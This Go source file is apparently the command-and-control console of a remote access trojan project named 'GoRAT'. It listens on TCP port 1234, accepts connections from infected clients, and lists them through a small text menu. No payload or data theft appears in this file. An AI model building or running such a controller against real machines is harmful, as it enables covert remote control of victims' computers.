package server

import (
	"GoRAT/internal/server/render"
	"fmt"
	"github.com/pterm/pterm"
	"net"
)

func Server() {

	err := render.MainBanner()

	if err != nil {
		fmt.Println(err)
		return
	}

	listener, err := net.Listen("tcp", ":1234")

	var list ClientList
	var command string

	if err != nil {
		fmt.Println(err)
		return
	}

	defer func(listener net.Listener) {
		err := listener.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
	}(listener)

	go newConnectionHandler(listener, &list)

	for {
		pterm.Println()
		pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Print(">> ")
		_, err := fmt.Scan(&command)

		if err != nil {
			fmt.Println(err)
			continue
		}

		if command == "h" || command == "help" {
			err := render.MainCommands()
			if err != nil {
				fmt.Println(err)
				continue
			}
		} else if command == "list" || command == "ls" {
			pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Waiting ...")
			render.ConnectionsHeader()
			if len(list.list) > 0 {
				for i := 0; i < len(list.list); i++ {
					pterm.DefaultBasicText.WithStyle(pterm.FgWhite.ToStyle()).Print(fmt.Sprintf("%d \t     | %s\n", i, list.list[i].name))
					pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Print("_________________________________\n")
				}
			} else {
				pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Connection list is empty")
			}

		} else {
			pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Wrong command. input 'h' or 'help' to show commands ")
		}

	}
}

func newConnectionHandler(listener net.Listener, list *ClientList) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}

		client := Client{name: conn.LocalAddr().String(), conn: conn}
		go client.clientHandler(list)
	}
}
